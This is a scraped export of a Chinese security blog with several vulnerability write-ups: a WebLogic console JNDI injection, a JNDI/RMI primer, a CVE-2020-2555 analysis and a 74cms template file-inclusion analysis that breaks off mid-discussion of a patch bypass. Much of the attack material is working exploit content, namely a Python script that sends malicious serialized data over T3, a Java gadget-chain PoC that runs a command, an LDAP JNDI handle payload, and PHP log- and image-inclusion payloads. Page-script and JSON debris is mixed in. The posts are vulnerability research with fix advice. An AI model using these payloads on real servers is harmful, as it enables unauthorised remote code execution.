163_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.176;1:1389/pq2ld0;AdminServer%22) 漏洞分析 我们注意到漏洞 poc 中包含类 com.bea.console.handles.JndiBindingHandle ，我们就在其中添加断点 console.jar!com.bea.console.handles.JndiBindingHandle#JndiBindingHandle(java.lang.String) 我们注意到 JndiBindingHandle 是一些初始化操作，进行实例化。 我们查看 Oracle_Home/wlserver/server/lib/consoleapp/webapp/consolejndi.portal 文件，发现标签 JNDIBindingPageGeneral 指定的路径是 /PortalConfig/jndi/jndibinding.portlet 跟进文件 jndibinding.portlet，看到程序最终调用 JNDIBindingAction 类 Oracle_Home/wlserver/server/lib/consoleapp/webapp/PortalConfig/jndi/jndicontext.portlet 我们在 JNDIBindingAction 类的函数 execute 中，看到了 JNDI 注入的关键函数 lookup，通过 lookup 去引用命名服务(RMI)和目录服务(LDAP)。 console.jar!com.bea.console.actions.jndi.JNDIBindingAction#execute 我们可以看到 lookup 中的值来源于 bindingHandle.getContext() + bindingHandle.getBinding() ，同时要执行到 lookup 需要满足 serverMBean != null ，serverName 的值来自 bindingHandle.getServer() 。 ServerMBean serverMBean = MBeanUtils.getAnyServerMBean(serverName); console.jar!com.bea.console.utils.MBeanUtils#getAnyServerMBean(java.lang.String) 跟进lookupServer com.oracle.weblogic.management.beanimpls.jar!weblogic.management.configuration.DomainMBeanImpl#lookupServer 在这里如果要满足有返回值的，传入的值必须等于 bean.getName() ，通过获取 this._Servers[0].getName() 可以得到这个值为 AdminServer 满足了执行条件之后，我们继续返回 JNDIBindingAction#execute 查看 lookup 函数中的参数的传入来自于 而context、bindName、serverName的值都是从bindingHandle中获取的，正巧我们可以控制JndiBindingHandle实例化的值（objectIdentifier），接着来就需要看下objectIdentifier和以上3个值有什么关系了，看一下3个成员变量的get函数，发现他们都和Component有关， console.jar!com.bea.console.handles.JndiBindingHandle 跟进 getComponent console.jar!com.bea.console.handles.HandleImpl#getComponent 跟进 getComponents console.jar!com.bea.console.handles.HandleImpl#getComponents 我们可以看到函数 getComponents 就是通过 this.getObjectIdentifier() 获取 objectIdentifier 的值，进而通过分号 ; 分隔开来，并将分割后的数据填入 String 数组。我们想要控制的参数都可以通过控制 objectIdentifier 的值来实现。 this.objectIdentifier 是在 JndiBindingHandle 类中的构造函数中初始化的。 console.jar!com.bea.console.utils.HandleUtils#handleFromQueryString 会获取参数中以 handle 为结尾的键值，再根据 request 请求的参数生产 handle 对象 console.jar!ccom.bea.console.handles.HandleConverter#convert console.jar!com.bea.console.handles.HandleFactory#getHandle 所以我们在请求中设置 JndiBindingHandlehandle=com.bea.console.handles.JndiBindingHandle(\"ldap://127.0.0.1:1389/Evil\")， lookup中的参数有两个，会将两个参数用 . 拼接起来，所以我们可以将 ldap://127.0.0.1:1389/Evil 中的任意一个 . 替换为 ; 同时还需要让serverName = AdminServer ，所以最后为 JndiBindingHandlehandle=com.bea.console.handles.JndiBindingHandle(\"ldap://127.0.0;1:1389/Evil;AdminServer\") 修复建议 1、升级Weblogic Server运行环境的JDK版本； 2、升级官方安全补丁，参考Oracle官网发布的补丁：Oracle Critical Patch Update Advisory - January 2021 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"初识JNDI注入","slug":"初识JNDI注入","date":"2021-01-15T06:21:16.000Z","updated":"2021-03-09T15:57:27.164Z","comments":true,"path":"2021/01/15/初识JNDI注入/","link":"","permalink":"http://yoursite.com/2021/01/15/%E5%88%9D%E8%AF%86JNDI%E6%B3%A8%E5%85%A5/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"浅析JNDI注入","slug":"初识JNDI注入/初识JNDI注入","date":"2021-01-15T06:21:16.000Z","updated":"2021-01-25T09:28:38.431Z","comments":true,"path":"2021/01/15/初识JNDI注入/初识JNDI注入/","link":"","permalink":"http://yoursite.com/2021/01/15/%E5%88%9D%E8%AF%86JNDI%E6%B3%A8%E5%85%A5/%E5%88%9D%E8%AF%86JNDI%E6%B3%A8%E5%85%A5/","excerpt":"JNDI JNDI 基础知识 JNDI 的全称是 Java Naming and Directory Interface (Java 命名和目录接口 )SUN 公司提供的一种标准的Java命名系统接口，JNDI 提供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。","text":"JNDI JNDI 基础知识 JNDI 的全称是 Java Naming and Directory Interface (Java 命名和目录接口 )SUN 公司提供的一种标准的Java命名系统接口，JNDI 提供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。 简而言之，JNDI 是一个简单的 JAVA API 接口，每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在 Remote Method Invocation (RMI)、Lightweight Directory Access Protocol (LDAP)、Common Object Request Broker Architecture (CORBA) 等等。 用我自己的话来说，就是 JAVA 应用程序不直接去调用一些服务，而是通过 JNDI 这个统一的通用接口去调用相关的服务，(服务包括用户、网络、机器、对象和服务等各种资源，eg：打印机、数据库服务、远程JAVA对象)之前我们去调用一些服务的时候，需要写的代码差别很大，但是有了 JNDI 这一层，就可以利用 JNDI 的方式来轻松的访问其他服务，这样访问不同的服务的代码实现基本是一样的。 命名服务 命名服务，顾名思义，就是帮助我们对资源进行命名的服务，命名服务的目的是定义一个唯一的名字，这个名字的作用是可以用来定义唯一的资源。命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务。 目录服务 目录服务是命名服务的扩展，它与命名服务的区别就是它可以通过对象属性来检索对象。eg:你在学校查找某人，那么会通过 年级 -&gt; 班级 -&gt; 姓名，这种方式来进行查找。年级、班级、姓名就属于某个人的属性，这种层级关系很像是目录关系，所以这种存储对象的方式就叫目录服务。LDAP 是典型的目录服务。 如图所示，JNDI 在访问 rmi 时只是传了一个键 foo 过去，RMI 服务端返回一个对象；JNDI 在访问 LADP 时，传入了多个键值对，代表对象的属性，LADP 服务端根据属性信息，返回对象。 RMI RMI 基础知识 RMI 的全称是 Rmote Method Invocation，远程方法调用。具体实现的过程是：远程服务器提供具体的类和方法，本地客户端会通过某种方式获得远程类的一个代理，然后通过这个代理调用远程对象的方法。方法的参数是通过序列化和反序列化的方式传递的。 本地客户端获取远程类的代理的方式是，借助了 Registry (注册中心) Server Registry Client 服务端，提供具体的远程对象 注册表，存放远程对象的相关信息（ip、端口、标识符） 客户端，远程对象的调用者 其中 Server 和 Registry 可以放在同一个服务器上，也可以布置在不同的服务器上。 RMI 流程： Registry 首先启动，并监听一个端口，一般是1099 Server 向 Registry 注册远程对象 Client 从 REgistry 获取远程对象的代理 Client 通过这个代理调用远程对象的方法 Server 端的代理接收到 Client 端调用的方法，参数，Server 端执行相对应的方法 Server 端的代理将执行结果返回给 Client 端代理 图中stub 就是客户端代理，skeleton 就是服务端代理 远程方法调用的通信模式如图所示 参考文章 JNDI注入是什么呀？ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"weblogic CVE-2020-2555","slug":"weblogic CVE-2020-2555","date":"2021-01-04T06:29:58.000Z","updated":"2021-03-09T15:57:27.162Z","comments":true,"path":"2021/01/04/weblogic CVE-2020-2555/","link":"","permalink":"http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/","excerpt":"漏洞简介 在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。","text":"漏洞简介 在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。 前置知识 - weblogic T3 协议 WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序(包括客户端及其他 WebLogic Server 实例) 间传输数据。在 java rmi 中，默认 rmi 使用的是 jrmp 协议，weblogic 包含高度优化了 rmi 的实现。 简单理解 t3 协议 weblogic t3 协议利用与防御 T3 协议包括 请求包头 请求主体 请求包头 12345t3 12.2.1AS:255HL:19MS:10000000PU:t3://us-l-breens:7001 每一行都以 \\n 结尾，weblogic 客户端与服务端发送的数据均以 \\n\\n 结尾。 同时，当我们发送 t3 请求包，可以获取服务器 weblogic 版本，服务器会将自身版本响应返回。 1234HELO:12.1.4.0 falseAS:2048HL:19MS:10000000 12345678910111213141516171819202122232425import socketimport osimport sysif len(sys.argv) &lt; 3: print('Usage: python {filename} &lt;host&gt; &lt;port&gt;'.format(filename=os.path.basename(sys.argv[0]))) sys.exit()sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)sock.settimeout(5)server_address = (sys.argv[1],int(sys.argv[2]))print('[+] Connecting to {host} port {port}'.format(host=sys.argv[1],port=sys.argv[2]))sock.connect(server_address)## Send Headerheaders='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'print ('sending \\n{headers}'.format(headers=headers))headers = headers.encode() ## python2 和 python3 在套接字返回值解码上有区别。python3是字节流，python2是字符串sock.sendall(headers)## Receiving Responsedata = sock.recv(1024)data = data.decode() print ('received \\n{data}'.format(data=data)) 只有先发送 T3 协议请求头，才能继续发送数据。我们通过仔细查看 T3 协议数据包，通过查看 hex ,发现其中 ac ed 00 05 序列化魔术头存在多处。我们可以将发送的数据包分为多个部分，第一部分和其他各个部分 第一部分的前四个字节为整个数据包的长度，其他各个部分均为 JAVA 序列化数据。 我们想利用 weblogic 的 T3 协议进行反序列化攻击时，我们有两种操作思路 ① 将weblogic 发送的数据中的任意一 JAVA 序列化数据替换为恶意的序列化数据；② 将 weblogic 发送的数据中第一部分与恶意的序列化数据进行拼接。同时，必须先发送 T3 协议头数据包，再发送 JAVA 序列化数据包，才能使 weblogic 进行 JAVA 反序列化进而触发漏洞。如果只发送 JAVA 序列化数据包，不先发送 T3 协议头数据包，无法触发反序列化。 编写一个脚本，能够通过 T3 协议发送 JAVA 恶意序列化数据。 建立 socket 请求 发送 T3 协议头数据 读取恶意序列化数据，拼接到第一部分之后 替换数据的前四个字节为第一部分数据+恶意序列化数据的长度 发送恶意数据 123456789101112131415161718192021222324252627282930313233343536373839404142import socketimport osimport sysimport structif len(sys.argv) &lt; 3: print('Usage: python {filename} &lt;host&gt; &lt;port&gt;'.format(filename=os.path.basename(sys.argv[0]))) sys.exit()sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)sock.settimeout(5)server_address = (sys.argv[1],int(sys.argv[2]))print('[+] Connecting to {host} port {port}'.format(host=sys.argv[1],port=sys.argv[2]))sock.connect(server_address)## Send Headerheaders='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'print ('sending \\n{headers}'.format(headers=headers))headers = headers.encode() ## python2 和 python3 在套接字返回值解码上有区别。python3是字节流，python2是字符串sock.sendall(headers)## Receiving Responsedata = sock.recv(1024)data = data.decode() print ('received \\n{data}'.format(data=data))## 读取恶意序列化数据payloadObj = open(sys.argv[3],'rb').read()## 第一部分数据payload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00'payload = payload.encode()## 拼接第一部分数据+恶意序列化数据payload = payload+payloadObj## 替换前四个字节为数据长度payload = struct.pack('&gt;I',len(payload)) + payload[4:]## 发送恶意数据print ('[+] Sending payload...')sock.send(payload) 环境安装 选用 jdk-8u261 weblogic 12.1.4.0 下载 weblogic 安装包后，以管理员身份打开 cmd 控制台，执行 java -jar fmw_12.2.1.4.0_wls_lite_generic.jar 一路 next 就好。 CVE-2020-2555 主要源于 conherence.jar 中存在着反序列化构造的类，并且利用 weblogic 默认存在的 T3 协议进行传输和解析进而导致 weblogic 服务器反序列化恶意代码最后执行攻击语句。 安装完成之后，启动 C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\startWebLogic.cmd 就可以启动 weblogic。 设置调试的话修改 user_project/domains/bin目录中 setDomainEnv.cmd 或者 setDomainEnv.sh 文件，在 if \"%debugFlag%\"==\"true\" 前加入 set debugFlag=true 在同一文件中 通过 set DEBUG_PORT=8453 指定了远程调试的端口 拷贝 Oracle_Home 目录下所有文件至调试目录，并且将 coherence\\lib 添加至 Libraries 配置 Remote 方式进行远程调试，端口为 8453 漏洞复现 选用上面构造好的 weblogic T3 脚本，根据版本信息 https://github.com/0nise/CVE-2020-2555/tree/master/file 选择合适的 java序列化数据 漏洞分析 1234567891011121314Gadget chain: （利用链） ObjectInputStream.readObject() BadAttributeValueExpException.readObject() LimitFilter.toString() ChainedExtractor.extract() ReflectionExtractor.extract() Method.invoke() Class.getMethod() ReflectionExtractor.extract() Method.invoke() Runtime.getRuntime() ReflectionExtractor.extract() Method.invoke() Runtime.exec() 因为调用链中利用到了 jdk 源代码中的 javax.management.BadAttributeValueExpException ，为了方便调试，我们需要将 jdk 代码加入到项目内部，在jdk 根目录下有 src.zip 加入项目中即可 通过查看补丁可以看到将 LimitFilter 类中的 toString() 方法中的 extract() 方法调用全部都移除，我们就可以知道，漏洞的触发位置就在此处。 在 java 反序列化链 CommonsCollections5 中利用 jdk 中 自带的 BadAttributeValueExpException 来调用任意类的 toString()方法。 javax.management.BadAttributeValueExpException#readObject 我们注意到，如果 m_comparator 是继承 ValueExtractor 接口的类时，才会去调用 extract() 方法。同时也将 this.m_oAnchorTop &amp;&amp; this.m_oAnchorBottom 作为参数，传入 ValueExtractor.extract()。 com.tangosol.util.filter.LimitFilter#toString 跟进类 ValueExtractor，查看 extract() 方法，发现 ValueExtractor 是一个接口的类，并且 extract() 是一个抽象方法，并没有实现。 因为这个漏洞是一个反序列化漏洞，所以我们需要在 ValueExtractor 的子类中找到实现 Serializable反序列化接口、具有 extract() 方法、在 extract() 方法中实现了命令执行。在 idea 中利用 ctrl + h 查看类或接口的继承关系。 com.tangosol.util.extractor.ReflectionExtractor#extract 我们可以看到 ReflectionExtractor 中的 extract 方法 ，调用了 method.invoke，两个参数都是序列化中的可控变量。不过仅凭单一的 method.invoke 是没有办法调用 Runtime.getRuntime().exec()，需要找一个中间点去反复的调用这个方法，就像 commons-collections-3.1 的 Gadget chain。 ChainedExtractor 的 extract 可以满足这个条件。 com.tangosol.util.extractor.ChainedExtractor#extract 构造 POC 创建一个 maven 项目，在项目文件夹下创建一个 lib 文件夹，将 weblogic 服务下 coherence/lib/coherence.jar 拷贝到文件夹下。针对不同版本的weblogic，需要不同版本下的 coherence.jar 。 POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import com.tangosol.util.extractor.ChainedExtractor;import com.tangosol.util.extractor.ReflectionExtractor;import com.tangosol.util.filter.LimitFilter;import javax.management.BadAttributeValueExpException;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;public class CVE_2020_2555 { public static void main(String[] args) throws Exception{ ReflectionExtractor[] extractors = { new ReflectionExtractor(\"getMethod\",new Object[]{\"getRuntime\",new Class[0]}), new ReflectionExtractor(\"invoke\", new Object[]{null,new Object[0]}), new ReflectionExtractor(\"exec\",new Object[]{\"calc.exe\"}) }; ChainedExtractor chainedExtractor =new ChainedExtractor(extractors); LimitFilter limitFilter = new LimitFilter(); // LimitFilter 类中的成员变量为 private,所以需要通过 setAccessible 来反射获取私有变量 // Field 反射中 获取类的相关信息 &amp;&amp; 对成员变量重新赋值 //m_comparator Field m_comparator = limitFilter.getClass().getDeclaredField(\"m_comparator\"); m_comparator.setAccessible(true); m_comparator.set(limitFilter, chainedExtractor); //m_oAnchorTop Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(\"m_oAnchorTop\"); m_oAnchorTop.setAccessible(true); m_oAnchorTop.set(limitFilter,Runtime.class); // val BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, limitFilter); // 序列化数据 serialize(badAttributeValueExpException); //反序列化数据 deserialize(); } //序列化数据 public static void serialize(Object object) throws Exception{ FileOutputStream fileOutputStream = new FileOutputStream(\"12214calc.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(object); objectOutputStream.close(); } //反序列化数据 public static void deserialize() throws Exception{ FileInputStream fileInputStream = new FileInputStream(\"12214calc.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); }} 整个调试过程跟 java 反序列化链 commons-collections-3.1 相似，甚至比之更加简单，就不再详细描述了。 不足之处 看到 Lucifaer 大佬说还有一种利用方式，是基于表达式注入的利用方式，比这种串联利用方式更加简单，应该跟 strut2 漏洞有些关系，等分析完 strut2 漏洞再回来看。 参考文章 Weblogic12c T3 协议安全漫谈 weblogic t3 协议利用与防御 CVE-2020-2555 漏洞分析 漫谈 Weblogic CVE-2020-2555 修复weblogic的JAVA反序列化漏洞的多种方法 Oracle Coherence 反序列化漏洞分析（CVE-2020-2555） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"骑士cms存在模板解析漏洞","slug":"骑士cms存在模板解析漏洞","date":"2020-12-15T02:27:32.000Z","updated":"2021-03-09T15:57:27.164Z","comments":true,"path":"2020/12/15/骑士cms存在模板解析漏洞/","link":"","permalink":"http://yoursite.com/2020/12/15/%E9%AA%91%E5%A3%ABcms%E5%AD%98%E5%9C%A8%E6%A8%A1%E6%9D%BF%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"漏洞简介 前段时间，骑士cms 发布了紧急风险漏洞升级通知，网上也有不少分析的文章，骑士cms 利用了 Thinkphp3.2.3 的框架，所以就想分析一下这个漏洞，对 Thinkphp3.2.3 的框架有一个初步的了解。","text":"漏洞简介 前段时间，骑士cms 发布了紧急风险漏洞升级通知，网上也有不少分析的文章，骑士cms 利用了 Thinkphp3.2.3 的框架，所以就想分析一下这个漏洞，对 Thinkphp3.2.3 的框架有一个初步的了解。 漏洞复现 我们选用 74cms v6.0.20作为复现的版本，选取 phpstudy 自带的 apache + mysql 环境来进行安装。 根据官网发布的信息，我们大致可以判断出漏洞存在的位置是 \\Common\\Controller\\BaseController::assign_resume_tpl 我们在函数内部加入断点，根据函数存在位置，属于 Common 模块下的 Base 控制器中的assign_resume_tpl ，构造路由 http://74cms.test/index.php?m=common&amp;c=base&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2 并不能直接进入断点位置 然后我就直接搜索了 错误信息 [ WE CAN DO IT JUST THINK ] 通过一步一步向上寻找错误触发的位置，发现是无法加载模块：Common \\Think\\Think::halt \\Think\\Think::appException ThinkPHP/Library/Think/Dispatcher.class.php 最后发现在加载模块时会检测模块名，无法加载 Common 模块。Common 模块无法直接调用，所以我们需要找其他方法调用 Common 模块下的 Base 控制器中的assign_resume_tpl 方法。 我们注意到 Home 模块下的 IndexController 继承 FrontendController FrontendController 继承 BaseController 所以我们通过构造路由 http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2 在第一次进行调试分析时，在关键地方加上断点，死活都进入不到断点定位的位置，但是相关功能已经执行，然后我发现会跟进一个文件 common~runtime.php 这个文件中乱七八糟的，但是里面的内容又好像是代码，通过查阅资料发现ThinkPHP的编译缓存文件~runtime.php ~runtime.php 中缓存的编译内容，相当于把 index.php 引导的所有操作全部集成到 ~runtime.php 文件中。有了这个缓存的编译文件，index.php 在下次运行时，不再引导，而是直接检测是否存在 ~runtime.php 编译缓存文件，如果在，则直接运行 ~runtime.php。 我就将文件夹下的 common~runtime.php 删除，就实现了调试自由。 通过包含日志实现命令执行 123http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tplPOST:variable=1&amp;tpl=&lt;?php phpinfo(); ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=\"info\" 企业id=\"$_GET['id']\"/&gt; data/Runtime/Logs/Home/20_12_17.log 123http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tplPOST:variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_17.log 通过包含图片实现命令执行 bmp 图片 123456#define test_width 16#define test_height 7&lt;?php phpinfo();die();?&gt;static char test_bits[] = {0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 }; 注册普通用户完善自己的信息时，在上传照片/作品处上传构造的恶意文件 查看上传成功的文件位置 12http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tplvariable=1&amp;tpl=data/upload/resume_img/2012/17/5fdb0459bba6a.bmp 在本地利用的是 windows 环境下的 phpstudy-php5.5.9，水泡泡师傅指点说，这个 trick 仅仅适用于 phpstudy 特定的 php 版本中才可以利用成功。 漏洞分析 通过包含日志实现命令执行 首先我们先在根目录下的 data 文件夹中放一个文件，尝试进行包含 构造payload http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=data/a \\Common\\Controller\\BaseController::assign_resume_tpl 在函数内部中调用了 fetch 方法，控制器中没有 fetch 方法 ，则继承自父类的 fetch 方法。 此时传递的 $tpl 是要被解析的模板的路径。 在父类中，看到进一步调用了 实例化 view 对象中的 fetch 方法。 \\Think\\Controller::fetch \\Think\\Controller::__construct 跟进 \\Think\\View::fetch ，此时 fetch 函数传递的三个参数，$templateFile 对应的是要被解析的模板的路径，$content 和 $prefix 的值为空。 \\Think\\View::fetch 因为 $content 的值为空 所以跟进函数 parseTemplate \\Think\\View::parseTemplate 在这个地方使用 is_file 函数判断传递的模板是否是个文件，如果文件存在且为正常的文件，则返回 true。 接下来回到函数 \\Think\\View::fetch 会进行 对 TMPL_ENGINE_TYPE 值的判断，通过查看 ThinkPHP/Conf/convention.php 可以看到 'TMPL_ENGINE_TYPE' =&gt; 'Think', 所以最后执行到了 Hook::listen('view_parse',$params); 。 \\Think\\Hook::listen 这个 Hook 类是一个行为扩展，在 thinkphp3.2 中称之为钩子，当我们传递一个 “view_parse” 的参数之后，实际上是触发了一个 “view_parse” 事件，在 Hook::listen 方法中，查找 $tags 变量中有没有绑定 “view_parse” 方法，然后用 foreach 遍历 $tags 属性，并执行 Hook:exec 方法。 在传递过程中注意到 “view_parse” 绑定了 Behavior\\ParseTemplateBehavior ThinkPHP/Mode/common.php \\Think\\Hook::exec 在 Hook::exec 会进行判断，当其中含有 Behavior 时，其入口方法为 run \\Behavior\\ParseTemplateBehavior::run 模板的引擎是 “think” 所以跟进第一个判断，如果是第一次解析 content 为空，进入 else，先实例化 template 类，然后再调用 fetch 方法。此时传入的参数 $_content 的值为 $data[‘file’] ，是解析模板的路径。 \\Think\\Template::fetch 在 \\Think\\Template::fetch 中调用 loadTemplate 来对解析的模板文件进行解析和编译 \\Think\\Template::loadTemplate 在 loadTemplate 中 首先读取了要解析的模板文件，将其保存在了 $tmplContent 中，然后利用 cpmplier 对模板文件进行编译 \\Think\\Template::compiler 在 complier 中将模板文件的内容直接拼接到 $tmplContent，对代码进行优化之后，直接返回代码。 又回到函数 \\Think\\Template::loadTemplate 将经过函数 complier 编译后的文件进行存储，最后返回存储的路径 data/Runtime/Cache/Home/1e84025731a9331f59f3a61078fe4420.php 再回到函数 \\Think\\Template::fetch 经过 loadTemplate 函数的处理，最后得到的是解析编译后模板文件的路径 \\Think\\Template::fetch 在 fetch 中调用 load 方法加载模板 \\Think\\Storage\\Driver\\File::load 在load 函数中进行了非空判断之后，直接调用了 include 去包含传入的文件地址 但是直接利用之前的 payload 在页面上显示为空，并没有直接回显出 phpinfo 的信息，这是因为在函数 \\Think\\View::fetch 中 在进行模板解析和包含之前 通过 ob_start 打开缓冲区， phpinfo 输出的信息被存储在缓冲区内， Hook::listen('view_parse',$params); 代码执行之后，又通过ob_get_clean() 获取并清空了缓存，因此虽然 phpinfo 执行成功，但是在页面上没有回显。 可以通过如下方法实现在页面上的回显 &lt;?php phpinfo(); ob_flush();?&gt; // ob_flush 输出缓冲区中的内容 &lt;?php phpinfo(); die();?&gt; 文件包含的流程图 知道文件包含的流程，现在就是要分析一下如何实现对将模板文件的上传，首先一处就是通过日志来实现 \\Think\\View::fetch 恰好在 fetch 函数中 首先判断了是否存在请求的模板文件，如果不存在模板文件就会将错误信息，写入日志文件中 data/Runtime/Logs/Home/20_12_22.log 然后再去包含日志文件就可以了。 为什么要通过 post 请求去生成日志，因为通过 get 请求中的 url 会在日志文件中被 url 编码， post 请求则不会。 照着网上的分析说的，但是好像不是很对，通过 get 方法也是可以成功的，建议自己进行尝试? 拓展思考 绕过骑士cms 补丁 我们关注一下骑士cms 的补丁信息 \\Common\\Controller\\BaseController::assign_resume_tpl ThinkPHP/Library/Think/View.class.php 仅仅是过滤了报错日志文件的生成，对文件包含漏洞并没进行修复(文件包含漏洞似乎是Thinkphp 3.2.3 